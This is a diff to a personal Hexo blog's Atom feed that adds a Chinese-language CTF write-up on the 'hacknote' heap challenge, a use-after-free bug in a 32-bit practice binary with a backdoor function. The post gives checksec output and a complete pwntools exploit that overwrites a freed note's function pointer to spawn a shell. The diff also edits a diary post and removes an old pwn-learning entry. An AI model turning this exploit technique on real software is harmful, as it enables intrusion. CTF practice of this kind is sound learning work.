@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2020-09-13T21:22:35.776Z</updated>
+  <updated>2020-09-22T17:10:19.428Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -17,11 +17,31 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>堆重启_uaf_hacknote</title>
+    <link href="http://yoursite.com/2020/09/23/%E5%A0%86%E9%87%8D%E5%90%AF_uaf_hacknote/"/>
+    <id>http://yoursite.com/2020/09/23/堆重启_uaf_hacknote/</id>
+    <published>2020-09-22T16:05:48.000Z</published>
+    <updated>2020-09-22T17:10:19.428Z</updated>
+    
+    <content type="html"><![CDATA[<p>Typora果然比有道云好用多了。test下图片功能。</p><a id="more"></a><h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://blog.eonew.cn/archives/<span class="number">490</span></span><br><span class="line">https://blog.csdn.net/weixin_44864859/article/details/<span class="number">107181869</span></span><br></pre></td></tr></table></figure><p>这里记录下经典的含有后门的UAF漏洞程序。//hacknote    最简单的堆题目      libc 2.23</p><p>以及 含后门的UAF漏洞程序 //hacknote</p><p>先看第一个含有后门的UAF漏洞程序：</p><h2 id="查看文件相关属性及开启保护"><a href="#查看文件相关属性及开启保护" class="headerlink" title="查看文件相关属性及开启保护"></a>查看文件相关属性及开启保护</h2><p>32位elf程序，没有去符号。// 给源代码会更香。</p><p> 只开启了NX保护。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ file hacknote_backdoor </span><br><span class="line">hacknote_backdoor: ELF <span class="number">32</span>-bit LSB executable, Intel <span class="number">80386</span>, version <span class="number">1</span> (SYSV), dynamically linked, </span><br><span class="line">interpreter /lib/ld-linux.so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">2.6</span><span class="number">.32</span>, BuildID[sha1]=<span class="number">44</span>ee75c492628b3691cdcdb07759e9bbe551644a, <span class="keyword">not</span> stripped</span><br><span class="line"></span><br><span class="line">$ checksec  hacknote_backdoor  </span><br><span class="line">[*] </span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x8048000</span>)</span><br></pre></td></tr></table></figure><h2 id="ida代码分析："><a href="#ida代码分析：" class="headerlink" title="ida代码分析："></a>ida代码分析：</h2><p><img src="https://s1.ax1x.com/2020/09/23/wXRF7q.png" alt="wXRF7q.png"></p><p>add_note:</p><p><img src="https://s1.ax1x.com/2020/09/23/wXRAA0.png" alt="wXRAA0.png"></p><p>其中 print_note_content函数为：</p><p><img src="https://s1.ax1x.com/2020/09/23/wXRiBn.png" alt="wXRiBn.png"></p><p>del_note:</p><p><img src="https://s1.ax1x.com/2020/09/23/wXR9Xj.png" alt="wXR9Xj.png"></p><p>print_note:</p><p><img src="https://s1.ax1x.com/2020/09/23/wXRPns.png" alt="wXRPns.png"></p><p>另外程序中含有 后门：</p><p><img src="https://s1.ax1x.com/2020/09/23/wXRENV.png" alt="wXRENV.png"></p><h2 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h2><p>创建2个0x18大写的chunk 此时：</p><p><img src="https://s1.ax1x.com/2020/09/23/wXRe9U.png" alt="wXRe9U.png"></p><p>然后依次删除 结构体下标为 0 和 1</p><p><img src="https://s1.ax1x.com/2020/09/23/wXRVhT.png" alt="wXRVhT.png"></p><p>然后我们申请 个 和固定大小一致的结构体即可。</p><p>往新申请的content_addr中 写入 后门函数地址。</p><p><img src="https://s1.ax1x.com/2020/09/23/wXRm3F.png" alt="wXRm3F.png"></p><p>最后 只要 print 结构体即可 拿到shell。</p><h2 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp:"></a>完整exp:</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">p=process(<span class="string">"./hacknote_backdoor"</span>)</span><br><span class="line"><span class="comment">#p=remote("node3.buuoj.cn",29525)</span></span><br><span class="line">elf=ELF(<span class="string">"./hacknote_backdoor"</span>)</span><br><span class="line">libc=ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"Your choice :"</span>,<span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Note size :"</span>,str(size))</span><br><span class="line">p.sendlineafter(<span class="string">"Content :"</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"Your choice :"</span>,<span class="string">"2"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Index :"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"Your choice :"</span>,<span class="string">"3"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Index :"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16)</span></span><br><span class="line"><span class="string">print "text_base : "+hex(text_base)</span></span><br><span class="line"><span class="string">print "jiegoutishuzu : "+hex(text_base+0x202040)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">magic=<span class="number">0x08048945</span></span><br><span class="line">notelist=<span class="number">0x0804A048</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">"\x11"</span>*<span class="number">8</span>)<span class="comment">#1 #2</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">"\x22"</span>*<span class="number">8</span>)<span class="comment">#3 #4</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">pd=p32(magic)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x8</span>,pd)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;Typora果然比有道云好用多了。test下图片功能。&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="堆重启" scheme="http://yoursite.com/tags/%E5%A0%86%E9%87%8D%E5%90%AF/"/>
+    
+  </entry>
+  
+  <entry>
     <title>疯狂的木头08</title>
     <link href="http://yoursite.com/2020/09/14/%E7%96%AF%E7%8B%82%E7%9A%84%E6%9C%A8%E5%A4%B408/"/>
     <id>http://yoursite.com/2020/09/14/疯狂的木头08/</id>
     <published>2020-09-13T21:01:04.000Z</published>
-    <updated>2020-09-13T21:22:35.776Z</updated>
+    <updated>2020-09-13T21:29:03.388Z</updated>
     
     <content type="html"><![CDATA[<p>最后一次了。你再继续颓废下去，就没有人等你了~</p><a id="more"></a><h2 id="又是一个漫长的夜晚"><a href="#又是一个漫长的夜晚" class="headerlink" title="又是一个漫长的夜晚"></a>又是一个漫长的夜晚</h2><blockquote><p>真的太长时间没有更了，不过这无疑给我一个很清楚的认识：不记录，不反思，脑子就会特别乱，没有长进。一直想一个人静静待着，实验室不想去，也不想与人交流，也不想学习。太可怕，我得自救呢。</p></blockquote><h2 id="持续记录"><a href="#持续记录" class="headerlink" title="持续记录"></a>持续记录</h2><blockquote><p>不被束缚，忠于内心。</p></blockquote><blockquote><p><a href="https://imgchr.com/i/wBUyWR" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/09/14/wBUyWR.png" alt="wBUyWR.png"></a></p></blockquote>]]></content>
     
@@ -393,26 +413,6 @@
     
     
       <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>照着ctfwiki就够了</title>
-    <link href="http://yoursite.com/2019/10/11/%E7%85%A7%E7%9D%80ctfwiki%E5%B0%B1%E5%A4%9F%E4%BA%86/"/>
-    <id>http://yoursite.com/2019/10/11/照着ctfwiki就够了/</id>
-    <published>2019-10-11T10:44:26.000Z</published>
-    <updated>2019-10-12T11:10:43.683Z</updated>
-    
-    <content type="html"><![CDATA[<p>早在很久前就听组长说过pwn了，但当时刚接触二进制，觉得逆向就很难入门了，一直拖到国庆节才开始学pwn，嗯…,还来的及，学就行了！</p><a id="more"></a><h1 id="一筐萝卜曰："><a href="#一筐萝卜曰：" class="headerlink" title="一筐萝卜曰："></a>一筐萝卜曰：</h1><blockquote><p>他当时也就是照ctfwiki学的，不用在网上找其它的教程之类的，这个网站的内容很优质！</p></blockquote><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>ctf-wiki.github.io<span class="regexp">/ctf-wiki/</span></span><br></pre></td></tr></table></figure><blockquote><p>但我之前看过了ctfWiki，但当时真的是看不懂，我是在网上却照着wp上学的，今天呢，又重新好好看看了ctfwiki，或许是练习十天后的结果吧，真看下去的话是能够看懂其实，（或许是之前学了段逆向的原因！理解的还算是很清晰，ctfwiki的内容确实很优质！）,以后就以这个为总线学习吧！<br>另外，刚开始的pwn中缓冲区溢出，这个链接也很优质：<a href="https://zhuanlan.zhihu.com/chaitin-tech" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/chaitin-tech</a></p></blockquote><h1 id="小结：pwn还是挺好玩的！哈哈！"><a href="#小结：pwn还是挺好玩的！哈哈！" class="headerlink" title="小结：pwn还是挺好玩的！哈哈！"></a>小结：pwn还是挺好玩的！哈哈！</h1><p><img src="https://s2.ax1x.com/2019/10/12/uXYW4J.jpg" alt="uXYW4J.jpg"></p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;早在很久前就听组长说过pwn了，但当时刚接触二进制，觉得逆向就很难入门了，一直拖到国庆节才开始学pwn，嗯…,还来的及，学就行了！&lt;/p&gt;
-    
-    </summary>
-    
-    
-      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
     
   </entry>
   
